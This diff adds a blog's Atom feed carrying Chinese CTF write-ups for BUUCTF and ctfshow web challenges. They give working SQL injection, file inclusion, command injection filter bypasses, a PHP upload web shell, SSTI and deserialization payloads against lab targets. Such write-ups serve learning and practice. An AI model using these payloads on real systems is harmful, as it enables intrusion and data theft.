@@ -1,0 +1,1615 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://gudiffany.github.io/</id>
+    <title>gudiffany_blog</title>
+    <updated>2022-09-24T16:08:17.290Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://gudiffany.github.io/"/>
+    <link rel="self" href="https://gudiffany.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://gudiffany.github.io/images/avatar.png</logo>
+    <icon>https://gudiffany.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, gudiffany_blog</rights>
+    <entry>
+        <title type="html"><![CDATA[buuctf 每日一题]]></title>
+        <id>https://gudiffany.github.io/post/buuctf-mei-ri-yi-ti-web-pian/</id>
+        <link href="https://gudiffany.github.io/post/buuctf-mei-ri-yi-ti-web-pian/">
+        </link>
+        <updated>2022-08-15T14:23:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="buuctf-每日一题更新中">buuctf 每日一题（更新中）</h1>
+<h2 id="1极客大挑战-2019easysql-2022815">1.[极客大挑战 2019]EasySQL 2022.8.15</h2>
+<p>post类型的报错注入</p>
+<p>对username和password注入都存在sql注入</p>
+<p>那么使用万能密码可以直接get flag</p>
+<pre><code>' or 1=1#
+</code></pre>
+<p>但是既然出现报错语句，那么可以对其进行基本的报错注入</p>
+<pre><code>username=1&amp;password=1' or 1=1#
+</code></pre>
+<p>结果直接出现flag（比较简陋）</p>
+<h2 id="2hctf-2018warmup-2022816">2.[HCTF 2018]WarmUp 2022.8.16</h2>
+<p>开局一张图，反手看F12</p>
+<p>发现有注释source.php</p>
+<p>放入网址发现是php代码</p>
+<pre><code>if (! empty($_REQUEST['file'])
+    &amp;&amp; is_string($_REQUEST['file'])
+    &amp;&amp; emmm::checkFile($_REQUEST['file'])
+  ) {
+    include $_REQUEST['file'];
+    exit;
+  } else {
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+  } 
+</code></pre>
+<p>上面要求file的要求：</p>
+<p>1.不为空</p>
+<p>2.是字符串</p>
+<p>3.经过checkFile函数</p>
+<p>看一下checkFile发现有hint.php</p>
+<p>看一下发现是提醒flag的所在flag in ffffllllaaaagggg</p>
+<p>那么</p>
+<pre><code>if (! isset($page) || !is_string($page)) {
+                echo &quot;you can't see it&quot;;
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo &quot;you can't see it&quot;;
+            return false;
+</code></pre>
+<pre><code>1.第一个``if``语句对变量进行检验，要求``$page``为字符串，否则返回false
+2.第二个``if``语句判断``$page``是否存在于``$whitelist``数组中，存在则返回true
+3.第三个``if``语句判断截取后的``$page``是否存在于``$whitelist``数组中，截取``$page``中``'?'``前部分，存在则返回true
+4.第四个``if``语句判断url解码并截取后的``$page``是否存在于``$whitelist``中，存在则返回true
+</code></pre>
+<p>那么分析下来需要在2，3，4中获得一个true反馈，那么第3个可以直接使用目录遍历漏洞直接达成，第四个通过url编码两次即可</p>
+<p>最终的两个payload：</p>
+<pre><code>?file=source.php?../../../../../ffffllllaaaagggg
+?file=source.php%253F../../../../../ffffllllaaaagggg
+</code></pre>
+<h2 id="3极客大挑战-2019havefun-2022817">3.[极客大挑战 2019]Havefun 2022.8.17</h2>
+<p>很简单的一道题</p>
+<p>查看代码发现是一个cat变量的get传参</p>
+<p>直接</p>
+<pre><code>?cat=dog
+</code></pre>
+<p>即可</p>
+<h2 id="4actf2020-新生赛include-2022817">4.[ACTF2020 新生赛]Include 2022.8.17</h2>
+<p>进入题目，有一个链接，点进去发现源代码空空</p>
+<p>再看看题目include，猜想可能是文件包含</p>
+<p>那么拿出最基本的payload试一下</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>查看题目的文件协议（php://filter）,接着是以base64编码（read=convert.base64-encode），目标文件为“flag.php”，接着题目就会变成base64编码：</p>
+<pre><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NmJjMjBiOGYtYWEwOC00OWE5LWFiMTItMWM3ZGQ4NzgxM2Q1fQo=
+</code></pre>
+<h2 id="5actf2020-新生赛exec-2022817">5.[ACTF2020 新生赛]Exec 2022.8.17</h2>
+<p>命令行注入，需要输入地址</p>
+<pre><code>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。
+2、;直接分号分隔
+管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假
+3、| 按位或
+作用是直接执行|后面的语句
+4、|| 逻辑或
+作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
+5、&amp; 按位与
+&amp;前面和后面命令都要执行，无论前面真假
+6、&amp;&amp; 逻辑与
+如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行
+</code></pre>
+<pre><code>127.0.0.1;cd ../../../;cat flag
+127.0.0.1|cat /flag
+127.0.0.1 &amp; cat /*g
+127.0.0.1 || cat /f*g
+</code></pre>
+<p>以上payload都是可以的</p>
+<h2 id="6suctf-2019easysql-2022818">6.[SUCTF 2019]EasySQL 2022.8.18</h2>
+<p>堆叠注入</p>
+<p>问题：我们尚未可知如何猜测出后台源码的，不过在网上找到公布的源码文件也确实是这样子的</p>
+<pre><code>sql=select.post[‘query’].&quot;||flag from Flag&quot;;
+</code></pre>
+<p>直接上payload</p>
+<pre><code>*;1 
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+</code></pre>
+<p>得到的语句</p>
+<pre><code>select *,1 from Flag  select * from table，返回查询表中的所有数据
+select 1;set sql_mode=PIPES_AS_CONCAT;select 1 and flag from Flag
+</code></pre>
+<pre><code>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则
+PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似
+
+常用sql_mode
+①ONLY_FULL_GROUP_BY
+对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中
+②NO_AUTO_VALUE_ON_ZERO
+该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。
+③STRICT_TRANS_TABLES
+如果一个值不能插入到一个事务中，则中断当前的操作，对非事务表不做限制
+④NO_ZERO_IN_DATE
+不允许日期和月份为零
+⑤NO_ZERO_DATE
+mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告
+⑥ERROR_FOR_DIVISION_BY_ZERO
+在insert或update过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时Mysql返回NULL
+⑦NO_AUTO_CREATE_USER
+禁止GRANT创建密码为空的用户
+⑧NO_ENGINE_SUBSTITUTION
+如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常
+⑨PIPES_AS_CONCAT
+将&quot;||&quot;视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样是，也和字符串的拼接函数Concat想类似
+⑩ANSI_QUOTES
+不能用双引号来引用字符串，因为它被解释为识别符
+</code></pre>
+<h2 id="7强网杯-2019随便注-2022818">7.[强网杯 2019]随便注 2022.8.18</h2>
+<p>SQL 支持两种重命名表的方式：</p>
+<pre><code>alter table old_table_name rename to new_table_name; 
+rename old_table _name to new_table_name;
+</code></pre>
+<p>法一</p>
+<pre><code>0';alter table `words` rename to `words1`;alter table `1919810931114514` rename to `words`;alter table `words` change `flag` `id` varchar(100);#
+</code></pre>
+<p>法二</p>
+<pre><code>打开一个表名为 tbl_name 的表的句柄
+
+HANDLER tbl_name OPEN [ [AS] alias]
+
+1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
+
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+
+2、通过索引查看表
+
+FIRST: 获取第一行（索引最小的一行）
+
+NEXT: 获取下一行
+
+PREV: 获取上一行
+
+LAST: 获取最后一行（索引最大的一行）
+
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+3、不通过索引查看表
+
+READ FIRST: 获取句柄的第一行
+
+READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
+
+最后一行执行之后再执行 READ NEXT 会返回一个空的结果
+
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+关闭已打开的句柄
+
+HANDLER tbl_name CLOSE
+</code></pre>
+<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
+</code></pre>
+<p>法三</p>
+<pre><code>MySQL的预编译语法为：
+
+
+//定义预编译语句
+PREPARE stmt_name FROM preparable_stmt;
+//执行预编译语句
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];
+
+解释一下，定义的时候，preparable_stmt代表的是预留数据位置的SQL语句，而stmt_name是类似变量名，代表这个SQL语句，下面举个例子：
+
+
+
+PREPARE test FROM 'SELECT (? + ?)';
+//即定义了一个两数相加的SQL预编译语句
+
+执行时，@var_name即变量，可以带入语句中进行执行，如：
+
+SET @a = 1;
+SET @b = 2; //给变量赋值
+
+EXECUTE test USING @a,@b;//执行 
+</code></pre>
+<p>作者：白袍大人 https://www.bilibili.com/read/cv5071554/ 出处：bilibili</p>
+<pre><code>-1';set @sql = CONCAT('sele','ct * from `1919810931114514`;');prepare aaa from @sql;EXECUTE aaa;#
+</code></pre>
+<h2 id="8极客大挑战-2019secret-file-2022823">8.[极客大挑战 2019]Secret File 2022.8.23</h2>
+<p>首先查看源代码，发现一个网址</p>
+<pre><code>href=&quot;[./Archive_room.php]&quot;
+</code></pre>
+<p>进入之后存在</p>
+<pre><code>href=&quot;[./action.php]&quot;
+</code></pre>
+<p>点击之后给出提示</p>
+<pre><code>查阅完毕，没看清么？回去再仔细看看吧。
+</code></pre>
+<p>因此存在重定向，用burp抓包</p>
+<pre><code>secr3t.php
+</code></pre>
+<p>进入之后得到源代码</p>
+<pre><code>$file=$_GET['file'];  
+if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){    
+echo &quot;Oh no!&quot;;    
+exit();  
+}  
+include($file); //flag放在了flag.php里
+</code></pre>
+<p>说明要传参file，不能用文件目录，文件tp命令，input命令，目录包含</p>
+<p>但是可以使用文件包含</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>即可得出flag</p>
+<h2 id="9gxyctf2019ping-ping-ping-2022823">9.[GXYCTF2019]Ping Ping Ping 2022.8.23</h2>
+<pre><code>?ip=127.0.0.1;cat flag
+</code></pre>
+<p>但是过滤了空格</p>
+<p>绕过方法</p>
+<pre><code>$IFS
+${IFS}
+$IFS$1   //$1改成$加其他数字貌似都行
+$IFS$9      (Ubuntu下测试通过)后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php
+&lt; 
+&lt;&gt; 
+{cat,flag.php}  //用逗号实现了空格功能
+%20 
+%09 
+
+ps:有时会禁用cat:
+解决方法是使用tac反向输出命令：
+linux命令中可以加，所以甚至可以cat /flag
+</code></pre>
+<p>第二，过滤了flag，查看一下index.php</p>
+<pre><code>/?ip= |\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    
+echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match); //过滤*   
+die(&quot;fxck your symbol!&quot;);  
+} 
+else if(preg_match(&quot;/ /&quot;, $ip)){    
+die(&quot;fxck your space!&quot;);  
+} 
+else if(preg_match(&quot;/bash/&quot;, $ip)){    
+die(&quot;fxck your bash!&quot;);  
+} 
+else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    
+die(&quot;fxck your flag!&quot;);  }  
+$a = shell_exec(&quot;ping -c 4 &quot;.$ip);  
+echo &quot;
+&quot;;
+  print_r($a);
+}
+?&gt;
+</code></pre>
+<p>法一：</p>
+<p>变量覆盖</p>
+<pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>法二：</p>
+<p>绕过bash</p>
+<pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>法三：</p>
+<p>内联，将输出的作为输入变量，使用反引号的优先执行特性</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<h2 id="10极客大挑战-2019lovesql-2022823">10.[极客大挑战 2019]LoveSQL 2022.8.23</h2>
+<p>使用万能密码试一下，发现password，看情况是md5加密的，不可逆</p>
+<p>只能手动报错注入了</p>
+<p>最终payload</p>
+<pre><code>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1
+
+/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&amp;password=1
+
+/check.php?username=1' union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1
+</code></pre>
+<h2 id="11bsidessf2020mini-matroyshka-2022824">11.[BSidesSF2020]mini-matroyshka 2022.8.24</h2>
+<p>我至今见过的套娃最多的题目</p>
+<pre><code>解码过程
+1.base64
+2.base64
+3.base64
+4.解压
+5.base16
+6.解压
+7.base64
+8.解压
+9.base32
+10.base16
+11.解压
+12.base64
+13.解压
+14.base16
+15.解压
+16.base16
+17.八进制转字符
+18.base64
+19.解压
+20.base64
+21.16进制转字符
+22.base64
+23.特定字符url解码
+24.base85
+25.10进制转字符
+26.base64
+27.解压
+28.base64
+29.摩斯电码
+30.base32
+31.base64
+32.base85
+33.解压
+34.base64
+35.base16
+36.10进制转字符
+37.base85
+38.摩斯电码
+39.base32
+</code></pre>
+<p>一把梭脚本如下</p>
+<pre><code class="language-python">import base64
+import gzip
+import re
+import urllib.parse
+
+dict = {
+    '.-': 'A',
+    '-...': 'B',
+    '-.-.': 'C',
+    '-..': 'D',
+    '.': 'E',
+    '..-.': 'F',
+    '--.': 'G',
+    '....': 'H',
+    '..': 'I',
+    '.---': 'J',
+    '-.-': 'K',
+    '.-..': 'L',
+    '--': 'M',
+    '-.': 'N',
+    '---': 'O',
+    '.--.': 'P',
+    '--.-': 'Q',
+    '.-.': 'R',
+    '...': 'S',
+    '-': 'T',
+    '..-': 'U',
+    '...-': 'V',
+    '.--': 'W',
+    '-..-': 'X',
+    '-.--': 'Y',
+    '--..': 'Z',
+    '.----': '1',
+    '..---': '2',
+    '...--': '3',
+    '....-': '4',
+    '.....': '5',
+    '-....': '6',
+    '--...': '7',
+    '---..': '8',
+    '----.': '9',
+    '-----': '0',
+    ',': '--..--',
+    '.-.-.-': '.',
+    '..--..': '?',
+    '-..-.': '/',
+    '-....-': '-',
+    '-.--.': '(',
+    '-.--.-': ')',
+    '-...-': '='
+};
+with open('flag.txt') as f:
+    content = f.read()
+content = content.strip()
+content = content.strip(&quot;'&quot;)
+content = content.strip(&quot;b'&quot;)
+content = content.encode()
+s = content
+s1 = base64.b64decode(s)
+s2 = base64.b64decode(s1)
+s3 = base64.b64decode(s2)
+s4 = gzip.decompress(s3)
+s5 = base64.b16decode(s4)
+s6 = gzip.decompress(s5)
+s7 = base64.b64decode(s6)
+s8 = gzip.decompress(s7)
+s9 = base64.b32decode(s8)
+s10 = base64.b16decode(s9)
+s11 = gzip.decompress(s10)
+s12 = base64.b64decode(s11)
+s13 = gzip.decompress(s12)
+s14 = base64.b16decode(s13)
+s15 = gzip.decompress(s14)
+s16 = base64.b16decode(s15)
+s16 = s16.decode()
+number = re.findall(&quot;\d+&quot;, s16)
+s17 = ''
+for i in number:
+    s17 += chr(int(i, 8))
+s18 = base64.b64decode(s17)
+s19 = gzip.decompress(s18)
+s20 = base64.b64decode(s19)
+s20 = s20.decode()
+number = re.findall(&quot;[0-9a-zA-Z]+&quot;, s20)
+s21 = ''
+for i in number:
+    s21 += chr(int(i, 16))
+s21 = s21.encode()
+s22 = base64.b64decode(s21)
+s22 = s22.decode()
+s22 = urllib.parse.unquote(s22)
+s22 = s22.encode()
+s23 = base64.b85decode(s22)
+s23 = s23.decode()
+res = ''
+number = re.findall(&quot;[0-9]+&quot;, s23)
+for i in number:
+    res += chr(int(i, 10))
+s23 = res.encode()
+s24 = base64.b64decode(s23)
+s25 = gzip.decompress(s24)
+s26 = base64.b64decode(s25)
+
+res = s26.decode()
+s27 = res.split(&quot; &quot;)
+s28 = ''
+for i in s27:
+    s28 += dict[i]
+s28 = s28.encode()
+s29 = base64.b32decode(s28)
+s30 = base64.b64decode(s29)
+s31 = base64.b85decode(s30)
+s32 = gzip.decompress(s31)
+s33 = base64.b64decode(s32)
+s34 = base64.b16decode(s33)
+s34 = s34.decode()
+res = ''
+number = re.findall(&quot;[0-9]+&quot;, s34)
+for i in number:
+    res += chr(int(i, 10))
+s35 = res.encode()
+s36 = base64.b85decode(s35)
+s36 = s36.decode()
+s37 = ''
+s38 = s36.split(&quot; &quot;)
+for i in s38:
+    s37 += dict[i]
+s37 = s37.encode()
+s37 = base64.b32decode(s37)
+print(s37.decode())
+</code></pre>
+<h2 id="12极客大挑战-2019knife-2022829">12.[极客大挑战 2019]Knife 2022.8.29</h2>
+<p>使用中国蚁剑链接即可在根目录下找到flag</p>
+<h2 id="13极客大挑战-2019http-2022829">13.[极客大挑战 2019]Http 2022.8.29</h2>
+<p>首先在源代码里面找到/Secret.php</p>
+<p>然后，根据提示添加修改报头</p>
+<pre><code>1.Referer:https://Sycsecret.buuoj.cn
+2.User-Agent: Syclover
+3.X-Forwarded-For:127.0.0.1
+</code></pre>
+<pre><code>GET /Secret.php HTTP/1.1
+Host: node4.buuoj.cn:25469
+User-Agent: Syclover
+referer:https://Sycsecret.buuoj.cn
+Content-Length: 0
+X-Forwarded-For:127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p>然后发包即可</p>
+<h2 id="14极客大挑战-2019upload-202294">14.[极客大挑战 2019]Upload 2022.9.4</h2>
+<p>首先用burp抓包上传文件的包，注意需要对原本上传的文件更改后缀名字.jpg</p>
+<p>然后</p>
+<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.phtml&quot;
+Content-Type: image/jpeg
+</code></pre>
+<p>Content-Type:更改为以上形式</p>
+<p>发现对文件内容也进行了限制，过滤了</p>
+<pre><code>&lt;?
+</code></pre>
+<p>可以使用文件头绕过</p>
+<pre><code>GIF89a?
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[shell])&lt;/script&gt;
+</code></pre>
+<p>最后使用蚁剑链接找到flag</p>
+<h2 id="15actf2020-新生赛upload-202294">15.[ACTF2020 新生赛]Upload 2022.9.4</h2>
+<p>同第14，只需完成第一步更改文件后缀即可，之后用蚁剑链接（会给出详细地址）</p>
+<h2 id="16极客大挑战-2019babysql-202295">16.[极客大挑战 2019]BabySQL 2022.9.5</h2>
+<p>使用最基本的判断字段回显的过程中，发现关键字被过滤</p>
+<p>使用双写绕过即可，其他与sql-labs完全一样</p>
+<pre><code class="language-sql">group_concat(schema_name) from information_schema.schemata--+
+
+group_concat(table_name) from information_schema.tables where table_schema='ctf'--+
+
+group_concat(column_name) from information_schema.columns where table_name='Flag'--+
+
+group_concat(flag) from ctf.Flag--+
+</code></pre>
+<p>可以试试上面的语句，少了什么加什么</p>
+<h2 id="17roarctf-2019easy-calc-202295">17.[RoarCTF 2019]Easy Calc 2022.9.5</h2>
+<p>相关函数：</p>
+<pre><code>print_r() 函数用于打印变量，以更容易理解的形式展示，获得变量信息
+var_dump() 函数用于输出变量的相关信息
+var_dump()和print_r()：可以打印复合型和资源型数据；var_dump()更加详细
+
+file_get_contents() 函数把整个文件读入一个字符串中，相比于file()，推荐使用file_get_contents()
+scandir() 函数返回指定目录中的文件和目录的数组
+</code></pre>
+<p>首先对于查看的源代码来看，会经过url编码导致无法通过</p>
+<pre><code>共同点：都不会对ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
+
+区别：
+1.encodeURI()方法的目的是对 URI 进行完整的编码，因此对以下在 URI 中具有特殊含义的 ASCII 标点符号，encodeURI() 函数是不会进行转义的：;/?:@&amp;=+$,#
+。encodeURIComponent()方法会对这些字符进行转义，以十六进制替换。
+2.encodeURI()方法用于整个的URI，而encodeURIComponent()常用于处理URI中的部分参数，比如浏览器地址有中文或者浏览器url参数操作的时候常用encodeURIComponent()。
+————————————————
+版权声明：本文为CSDN博主「web_harry」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/web_harry/article/details/72191287
+</code></pre>
+<p>方法一：空格绕过waf</p>
+<p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户</a></p>
+<p>方法二：http走私</p>
+<p>暂时没复现</p>
+<p>之后要绕过</p>
+<pre><code>&lt;?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+  show_source(__FILE__);
+}else{
+    $str = $_GET['num'];
+    $blacklist = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]','\$','\\','\^'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $str)) {
+            die(&quot;what are you want to do?&quot;);
+        }
+    }
+    eval('echo '.$str.';');
+}
+?&gt;
+</code></pre>
+<p>使用chr函数编码即可</p>
+<pre><code>? num=var_dump(scandir(chr(47)))
+? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+</code></pre>
+<h2 id="18护网杯-2018easy_tornado-202296">18.[护网杯 2018]easy_tornado 2022.9.6</h2>
+<pre><code>POST /pay.php HTTP/1.1
+Host: bc0e0b90-54d1-4946-9f95-83a6bec9b0da.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://bc0e0b90-54d1-4946-9f95-83a6bec9b0da.node4.buuoj.cn:81/
+Connection: close
+Cookie: user=1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+password=404a&amp;money=1e9
+</code></pre>
+<p>首先要是cuit的学生：那么猜测需要更改cookie，用1试一下，不然只能开爆破了</p>
+<p>第二需要正确的pwd，根据php弱类型传入404a</p>
+<p>第三需要100000000的钱数，但是长度不能过长，使用科学计数法1e9</p>
+<h2 id="19护网杯-2018easy_tornado">19.[护网杯 2018]easy_tornado</h2>
+<p>首先在三个链接中获得：</p>
+<p>1.flag地址</p>
+<p>2.render</p>
+<p>3.加密方式</p>
+<p>从render中发现渲染模板进行ssti注入</p>
+<pre><code>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用。
+Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。
+在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量
+</code></pre>
+<p>然后注入点在error?msg=Error处</p>
+<p>通过</p>
+<pre><code>msg={{handler.settings}}
+</code></pre>
+<p>获取秘密cookie</p>
+<p>然后写脚本</p>
+<pre><code>import hashlib
+
+string = 'f5474199-8c4d-4bde-a54a-1dca9c094208'
+sec = '/fllllllllllllag'
+
+
+def md5(s):
+    md5 = hashlib.md5()
+    md5.update(s.encode('utf-8'))  # 转码，update里的必须是字节型
+    res = md5.hexdigest()  # 返回字符型摘要信息
+    return res
+
+
+print(&quot;md5加密结果:&quot;, md5(string + md5(sec)))
+</code></pre>
+<p>构造payload</p>
+<pre><code>file?filename=/fllllllllllllag&amp;filehash=9a2ccbbc7d48bb5aacb23f02e0737444
+</code></pre>
+<p>获得flag</p>
+<h2 id="20极客大挑战-2019php">20.[极客大挑战 2019]PHP</h2>
+<p>1.先用dirsearch扫一下</p>
+<p>出现www.zip</p>
+<p>然后看源码</p>
+<p>2.首先要传参select，该变量会进行反序列化，那么本题应该就是反序列化了</p>
+<p>3.只要</p>
+<pre><code>&lt;?php
+
+class Name
+{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username, $password)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+}
+
+$a = new Name('admin', 100);
+
+var_dump(serialize($a))
+
+?&gt;
+</code></pre>
+<p>得出</p>
+<p>其中过滤了部分符号，用%00代替，而且要绕过__wakeup()函数，属性个数大于实际属性个数时，就会跳过wakeup()</p>
+<pre><code>http://29ca719a-6559-4472-a0e1-d855df860e55.node4.buuoj.cn:81/?select=O:4:&quot;Name&quot;:4:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
+</code></pre>
+<h2 id="21actf2020-新生赛backupfile">21.[ACTF2020 新生赛]BackupFile</h2>
+<p>1.dirsearch下载到index.php.bak</p>
+<p>2.弱类型比较</p>
+<pre><code>&lt;?php
+include_once &quot;flag.php&quot;;
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit(&quot;Just num!&quot;);
+    }
+    $key = intval($key);
+    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo &quot;Try to find out source file!&quot;;
+}
+</code></pre>
+<pre><code>http://e1c3daab-623c-4fc6-8493-a3d7725aaa6b.node4.buuoj.cn:81/?key=123
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ctfshow 萌新web 更新中]]></title>
+        <id>https://gudiffany.github.io/post/ctfshow-meng-xin-web/</id>
+        <link href="https://gudiffany.github.io/post/ctfshow-meng-xin-web/">
+        </link>
+        <updated>2022-08-15T03:31:52.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ctfshow-萌新web">ctfshow 萌新web</h1>
+<h2 id="1web1">1.web1</h2>
+<pre><code class="language-php+HTML">&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+\# 包含数据库连接文件
+include(&quot;config.php&quot;);
+\# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+  $id = $_GET['id'];
+  \# 判断id的值是否大于999
+  if(intval($id) &gt; 999){
+    \# id 大于 999 直接退出并返回错误
+    die(&quot;id error&quot;);
+  }else{
+    \# id 小于 999 拼接sql语句
+    $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;
+    echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;
+    \# 执行sql 语句
+    $result = $conn-&gt;query($sql);
+    \# 判断有没有查询结果
+    if ($result-&gt;num_rows &gt; 0) {
+      \# 如果有结果，获取结果对象的值$row
+      while($row = $result-&gt;fetch_assoc()) {
+        echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;
+      }
+    }
+    \# 关闭数据库连接
+    $conn-&gt;close();
+  }
+  
+}else{
+  highlight_file(__FILE__);
+}
+
+?&gt;
+&lt;/body&gt;
+&lt;!-- flag in id = 1000 --&gt;
+&lt;/html&gt;
+</code></pre>
+<p>那么需要绕过的只有</p>
+<p>intval()函数，由于其函数传递的参数 id = 2 or id = 1000 被当做一个字符串 ' 2 or id = 1000' , intval()函数会从字符串的开始进行转换, 直到遇到非数字的字符, 转换到or的时候, 由于or不是数字类型的字符, 从而停止转换, 转换的结果就只有 2</p>
+<p>可以采用传入多个数字的手法绕过</p>
+<pre><code>?id=2 or id=1000
+</code></pre>
+<p>其中id=2必须为空值，这样才能使得sql语句执行后面的id=1000</p>
+<p>于是为了防止2有值，最好使用负数</p>
+<h2 id="2web2">2.web2</h2>
+<p>在web1的基础上多加了一层对or的过滤</p>
+<p>可以用||代替or</p>
+<pre><code>?id=-1 || id=1000
+</code></pre>
+<h2 id="3web3">3.web3</h2>
